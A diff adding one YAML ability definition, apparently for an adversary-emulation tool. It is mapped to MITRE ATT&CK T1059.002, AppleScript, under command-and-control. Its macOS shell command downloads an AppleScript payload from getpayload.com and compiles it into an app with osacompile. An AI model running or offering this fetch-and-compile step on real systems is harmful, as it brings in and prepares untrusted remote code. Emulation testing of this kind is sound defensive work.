@@ -1,0 +1,21 @@
+---
+
+- id: 12476a99-289a-c22b-ef5c-80d92c33d74f
+  name: osacompile - Download and compile a payload
+  description: The following command downloads an applescript payload from getpayload.com and compiles
+    it into an app.
+  tactic: command-and-control
+  technique:
+    attack_id: T1059.002
+    name: 'Command and Scripting Interpreter: AppleScript'
+  platforms:
+    darwin:
+      sh:
+        command: curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script
+          -o payload.app
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - osacompile
+  - command-and-control
